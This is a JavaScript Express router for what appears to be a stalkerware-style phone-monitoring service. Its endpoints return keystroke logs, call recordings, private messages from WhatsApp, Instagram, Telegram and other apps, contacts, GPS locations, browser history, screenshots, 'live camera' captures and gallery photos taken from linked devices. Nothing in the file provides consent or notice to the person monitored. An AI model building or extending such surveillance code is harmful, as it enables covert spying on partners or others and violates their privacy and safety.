const express = require('express');
const router = express.Router();
const { protect } = require('../middleware/auth');
const Device = require('../models/Device');
const CallLog = require('../models/CallLog');
const Message = require('../models/Message');
const Contact = require('../models/Contact');
const Location = require('../models/Location');
const BrowserHistory = require('../models/BrowserHistory');
const Screenshot = require('../models/Screenshot');
const Keylog = require('../models/Keylog');
const KeywordAlert = require('../models/KeywordAlert');
const Geofence = require('../models/Geofence');
const AppUsage = require('../models/AppUsage');
const CallRecording = require('../models/CallRecording');
const Photo = require('../models/Photo');          // ✅ NEW

const getDeviceIds = async (userId) => {
  const devices = await Device.find({ userId });
  return devices.map(d => d._id);
};

// Dashboard stats (enhanced)
router.get('/stats', protect, async (req, res) => {
  try {
    const deviceIds = await getDeviceIds(req.user._id);
    const totalDevices = deviceIds.length;
    const totalMessages = await Message.countDocuments({ deviceId: { $in: deviceIds } });
    const totalCalls = await CallLog.countDocuments({ deviceId: { $in: deviceIds } });
    const totalLocations = await Location.countDocuments({ deviceId: { $in: deviceIds } });
    const totalScreenshots = await Screenshot.countDocuments({ deviceId: { $in: deviceIds } });
    const totalKeylogs = await Keylog.countDocuments({ deviceId: { $in: deviceIds } });
    const totalAppUsage = await AppUsage.countDocuments({ deviceId: { $in: deviceIds } });
    
    // Optional: message breakdown by app
    const messageBreakdown = await Message.aggregate([
      { $match: { deviceId: { $in: deviceIds } } },
      { $group: { _id: '$app', count: { $sum: 1 } } }
    ]);
    
    res.json({ success: true, stats: {
      totalDevices, totalMessages, totalCalls, totalLocations,
      totalScreenshots, totalKeylogs, totalAppUsage,
      messageBreakdown
    } });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

// Get devices
router.get('/devices', protect, async (req, res) => {
  try {
    const devices = await Device.find({ userId: req.user._id });
    res.json({ success: true, data: devices });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

// Get call logs
router.get('/calls', protect, async (req, res) => {
  try {
    const deviceIds = await getDeviceIds(req.user._id);
    const data = await CallLog.find({ deviceId: { $in: deviceIds } }).sort({ timestamp: -1 }).limit(200);
    res.json({ success: true, data });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

// Get call recordings
router.get('/call-recordings', protect, async (req, res) => {
  try {
    const deviceIds = await getDeviceIds(req.user._id);
    const recordings = await CallRecording.find({ deviceId: { $in: deviceIds } }).sort({ timestamp: -1 }).limit(100);
    res.json({ success: true, data: recordings });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

// Get all messages (generic)
router.get('/messages', protect, async (req, res) => {
  try {
    const deviceIds = await getDeviceIds(req.user._id);
    const data = await Message.find({ deviceId: { $in: deviceIds } }).sort({ timestamp: -1 }).limit(200);
    res.json({ success: true, data });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

// ✅ NEW: Get messages by specific app (WhatsApp, Instagram, etc.)
router.get('/messages/:app', protect, async (req, res) => {
  try {
    const { app } = req.params;
    const validApps = ['sms', 'whatsapp', 'instagram', 'messenger', 'telegram', 'tiktok', 'facebook'];
    if (!validApps.includes(app)) {
      return res.status(400).json({ success: false, message: 'Invalid app name' });
    }
    const deviceIds = await getDeviceIds(req.user._id);
    const data = await Message.find({ deviceId: { $in: deviceIds }, app })
                              .sort({ timestamp: -1 })
                              .limit(200);
    res.json({ success: true, data });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

// ✅ NEW: Facebook messages (if you extend Message model enum to include 'facebook')
router.get('/facebook', protect, async (req, res) => {
  try {
    const deviceIds = await getDeviceIds(req.user._id);
    // If you have added 'facebook' to Message.app enum, use:
    const data = await Message.find({ deviceId: { $in: deviceIds }, app: 'facebook' })
                              .sort({ timestamp: -1 })
                              .limit(200);
    res.json({ success: true, data });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

// Get contacts
router.get('/contacts', protect, async (req, res) => {
  try {
    const deviceIds = await getDeviceIds(req.user._id);
    const data = await Contact.find({ deviceId: { $in: deviceIds } });
    res.json({ success: true, data });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

// Get locations
router.get('/locations', protect, async (req, res) => {
  try {
    const deviceIds = await getDeviceIds(req.user._id);
    const data = await Location.find({ deviceId: { $in: deviceIds } }).sort({ timestamp: -1 }).limit(200);
    res.json({ success: true, data });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

// Get browser history
router.get('/browser', protect, async (req, res) => {
  try {
    const deviceIds = await getDeviceIds(req.user._id);
    const data = await BrowserHistory.find({ deviceId: { $in: deviceIds } }).sort({ visitTime: -1 }).limit(200);
    res.json({ success: true, data });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

// Get screenshots
router.get('/screenshots', protect, async (req, res) => {
  try {
    const deviceIds = await getDeviceIds(req.user._id);
    const data = await Screenshot.find({ deviceId: { $in: deviceIds } }).sort({ timestamp: -1 }).limit(100);
    res.json({ success: true, data });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

// Get keylogs
router.get('/keylogs', protect, async (req, res) => {
  try {
    const deviceIds = await getDeviceIds(req.user._id);
    const data = await Keylog.find({ deviceId: { $in: deviceIds } }).sort({ timestamp: -1 }).limit(500);
    res.json({ success: true, data });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

// Get keyword alerts
router.get('/keyword-alerts', protect, async (req, res) => {
  try {
    const deviceIds = await getDeviceIds(req.user._id);
    const data = await KeywordAlert.find({ deviceId: { $in: deviceIds } }).sort({ timestamp: -1 }).limit(200);
    res.json({ success: true, data });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

// Get geofence events
router.get('/geofence', protect, async (req, res) => {
  try {
    const deviceIds = await getDeviceIds(req.user._id);
    const data = await Geofence.find({ deviceId: { $in: deviceIds } }).sort({ timestamp: -1 }).limit(200);
    res.json({ success: true, data });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

// Get app usage
router.get('/app-usage', protect, async (req, res) => {
  try {
    const deviceIds = await getDeviceIds(req.user._id);
    const data = await AppUsage.find({ deviceId: { $in: deviceIds } }).sort({ timestamp: -1 }).limit(200);
    res.json({ success: true, data });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

// ✅ NEW: Live camera images (using Screenshot model with type 'live')
router.get('/live-camera', protect, async (req, res) => {
  try {
    const deviceIds = await getDeviceIds(req.user._id);
    const images = await Screenshot.find({ deviceId: { $in: deviceIds }, type: 'live' })
                                    .sort({ timestamp: -1 })
                                    .limit(50);
    res.json({ success: true, data: images });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

// Get latest photos (from gallery/camera)
router.get('/photos', protect, async (req, res) => {
  try {
    const deviceIds = await getDeviceIds(req.user._id);
    const photos = await Photo.find({ deviceId: { $in: deviceIds } })
      .sort({ timestamp: -1 })
      .limit(50);
    res.json({ success: true, data: photos });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

// Combined recent activity (for dashboard)
router.get('/recent', protect, async (req, res) => {
  try {
    const deviceIds = await getDeviceIds(req.user._id);
    const calls = await CallLog.find({ deviceId: { $in: deviceIds } }).sort({ timestamp: -1 }).limit(10);
    const messages = await Message.find({ deviceId: { $in: deviceIds } }).sort({ timestamp: -1 }).limit(10);
    const locations = await Location.find({ deviceId: { $in: deviceIds } }).sort({ timestamp: -1 }).limit(10);
    const keylogs = await Keylog.find({ deviceId: { $in: deviceIds } }).sort({ timestamp: -1 }).limit(10);
    let all = [...calls, ...messages, ...locations, ...keylogs];
    all.sort((a,b) => new Date(b.timestamp) - new Date(a.timestamp));
    res.json({ success: true, data: all.slice(0, 30) });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

module.exports = router;